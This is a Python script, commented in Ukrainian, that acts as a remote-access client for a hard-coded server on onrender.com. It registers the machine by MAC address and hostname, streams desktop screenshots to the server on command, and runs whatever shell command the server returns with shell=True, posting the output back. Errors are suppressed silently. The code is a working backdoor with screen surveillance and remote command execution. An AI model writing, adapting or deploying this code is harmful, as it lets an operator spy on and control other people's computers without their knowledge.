import time
import io
import threading
import subprocess
import requests
import socket
import uuid
from PIL import ImageGrab

# Вкажіть IP вашого сервера
SERVER_URL = "https://zlata.onrender.com"

# Генеруємо унікальний ID для цього ПК та дістаємо його ім'я
CLIENT_ID = str(uuid.getnode()) + "-" + socket.gethostname()
PC_NAME = socket.gethostname()

STREAMING_ACTIVE = False

def stream_screen():
    global STREAMING_ACTIVE
    while True:
        # Транслюємо екран ТІЛЬКИ якщо сервер дав команду (якщо адмін дивиться)
        if STREAMING_ACTIVE:
            try:
                img = ImageGrab.grab()
                buffer = io.BytesIO()
                img.save(buffer, format='JPEG', quality=40)
                
                requests.post(
                    f"{SERVER_URL}/api/upload_frame/{CLIENT_ID}",
                    data=buffer.getvalue(),
                    timeout=2
                )
            except Exception:
                pass
            time.sleep(0.05) # ~20 FPS
        else:
            # Якщо адмін не дивиться — просто спимо і не їмо пам'ять/процесор
            time.sleep(0.5)

def heartbeat_and_cmd():
    global STREAMING_ACTIVE
    while True:
        try:
            # Надсилаємо серверу "пульс", щоб він знав, що ми в мережі
            payload = {"client_id": CLIENT_ID, "name": PC_NAME}
            res = requests.post(f"{SERVER_URL}/api/heartbeat", json=payload, timeout=3)
            
            if res.status_code == 200:
                data = res.json()
                
                # Сервер вирішує, чи маємо ми зараз знімати екран
                STREAMING_ACTIVE = data.get("stream", False)
                
                # Перевіряємо чи є нові команди
                cmd = data.get("cmd", "")
                if cmd:
                    proc = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    output = proc.stdout + proc.stderr
                    if not output.strip():
                        output = "[Команду виконано успішно]"
                    
                    requests.post(
                        f"{SERVER_URL}/api/post_output/{CLIENT_ID}",
                        data=output.encode("utf-8"),
                        timeout=3
                    )
        except Exception:
            # Якщо сервер впав, припиняємо зйомку екрана
            STREAMING_ACTIVE = False
            
        time.sleep(1) # Перевіряємо зв'язок кожну секунду

if __name__ == "__main__":
    # Запускаємо потік для зйомки екрану у фоні
    threading.Thread(target=stream_screen, daemon=True).start()
    # Запускаємо основний цикл зв'язку з сервером
    heartbeat_and_cmd()
